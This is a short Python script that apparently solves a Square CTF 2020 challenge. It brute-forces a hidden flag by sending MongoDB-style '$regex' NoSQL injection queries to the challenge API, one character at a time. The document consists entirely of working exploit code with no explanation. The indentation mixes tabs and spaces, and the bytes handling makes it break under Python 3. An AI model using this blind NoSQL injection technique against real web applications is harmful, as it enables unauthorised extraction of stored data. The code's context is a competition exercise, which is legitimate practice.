import requests
import string

flag = 'flag{'
base_url = 'http://challenges.2020.squarectf.com:9542/api/posts?title=flag&'

while True:
    for char in string.ascii_letters + string.digits + '}{_':
    	url = base_url + 'flag[$regex]=' + flag + char
        req = requests.get(url)
        if "flag" in req.content:
            flag += str(char)
            print('Flag: {}'.format(flag))
            if char == "}":
                exit(0)
            break